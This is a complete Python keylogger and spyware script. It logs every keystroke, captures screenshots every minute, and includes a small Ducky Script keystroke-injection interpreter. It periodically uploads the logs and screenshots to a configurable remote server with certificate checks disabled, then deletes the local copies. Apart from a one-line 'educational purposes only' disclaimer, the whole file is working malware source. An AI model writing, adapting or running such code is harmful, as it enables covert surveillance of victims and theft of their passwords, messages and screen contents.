import os
import time
import datetime
import requests
from pynput.keyboard import Listener
from PIL import Image
import pyautogui
import threading
import urllib3

# Suppress SSL warnings for self-signed certificates (for demo purposes)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Configuration
SERVER_URL = "http://localhost:5000/upload"  # Change to your server IP/port
LOG_FILE = "keystrokes.log"
SCREENSHOT_DIR = "screenshots"
DUCKY_SCRIPT = "ducky_script.txt"
SEND_INTERVAL = 30  # Seconds between data sends
SCREENSHOT_INTERVAL = 60  # Seconds between screenshots

# Ensure directories exist
if not os.path.exists(SCREENSHOT_DIR):
    os.makedirs(SCREENSHOT_DIR)

# Keylogger
keystrokes = []

def on_press(key):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_str = str(key).replace("'", "")
        if key_str.startswith("Key."):
            key_str = f"[{key_str}]"
        keystrokes.append(f"{timestamp}: {key_str}\n")
        with open(LOG_FILE, "a") as f:
            f.write(f"{timestamp}: {key_str}\n")
    except Exception as e:
        print(f"Error logging key: {e}")

# Screenshot capture
def take_screenshot():
    while True:
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot_path = os.path.join(SCREENSHOT_DIR, f"screenshot_{timestamp}.png")
            screenshot = pyautogui.screenshot()
            rgb_screenshot = screenshot.rgb
            img = Image.frombytes("RGB", screenshot.size, rgb_screenshot)
            img.save(screenshot_path, "PNG")
        except Exception as e:
            print(f"Error capturing screenshot: {e}")
        time.sleep(SCREENSHOT_INTERVAL)

# Ducky Script execution
def execute_ducky_script(script_path):
    try:
        with open(script_path, "r") as f:
            lines = f.readlines()
        for line in lines:
            line = line.strip()
            if line.startswith("REM"):
                continue  # Skip comments
            elif line.startswith("STRING"):
                text = line.replace("STRING ", "")
                pyautogui.write(text)
            elif line == "ENTER":
                pyautogui.press("enter")
            elif line == "GUI r":
                pyautogui.hotkey("win", "r")
            elif line.startswith("DELAY"):
                delay = int(line.replace("DELAY ", ""))
                time.sleep(delay / 1000.0)
            else:
                print(f"Unsupported Ducky command: {line}")
    except Exception as e:
        print(f"Error executing Ducky Script: {e}")

# Send data to server
def send_data():
    while True:
        try:
            # Send keystroke log
            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                with open(LOG_FILE, "rb") as f:
                    files = {"file": (LOG_FILE, f, "text/plain")}
                    response = requests.post(SERVER_URL, files=files, verify=False)
                    if response.status_code == 200:
                        print("Keystroke log sent successfully")
                        # Clear log file after sending
                        open(LOG_FILE, "w").close()
                    else:
                        print(f"Failed to send keystroke log: {response.status_code}")

            # Send screenshots
            for filename in os.listdir(SCREENSHOT_DIR):
                filepath = os.path.join(SCREENSHOT_DIR, filename)
                if os.path.isfile(filepath):
                    with open(filepath, "rb") as f:
                        files = {"file": (filename, f, "image/png")}
                        response = requests.post(SERVER_URL, files=files, verify=False)
                        if response.status_code == 200:
                            print(f"Screenshot {filename} sent successfully")
                            os.remove(filepath)  # Delete after sending
                        else:
                            print(f"Failed to send screenshot {filename}: {response.status_code}")
        except Exception as e:
            print(f"Error sending data: {e}")
        time.sleep(SEND_INTERVAL)

# Main function
def main():
    print("Starting keylogger... Ensure you have legal permission to monitor this system.")
    print("This tool is for educational purposes only.")

    # Create a sample Ducky Script
    ducky_content = """REM Sample Ducky Script
GUI r
DELAY 500
STRING notepad
ENTER
DELAY 500
STRING Hello from Ducky Script!
ENTER
"""
    with open(DUCKY_SCRIPT, "w") as f:
        f.write(ducky_content)

    # Start keylogger
    listener = Listener(on_press=on_press)
    listener.start()

    # Start screenshot thread
    screenshot_thread = threading.Thread(target=take_screenshot, daemon=True)
    screenshot_thread.start()

    # Execute Ducky Script
    print("Executing Ducky Script...")
    execute_ducky_script(DUCKY_SCRIPT)

    # Start data sending thread
    send_thread = threading.Thread(target=send_data, daemon=True)
    send_thread.start()

    # Keep the program running
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Stopping keylogger...")
        listener.stop()

if __name__ == "__main__":
    main()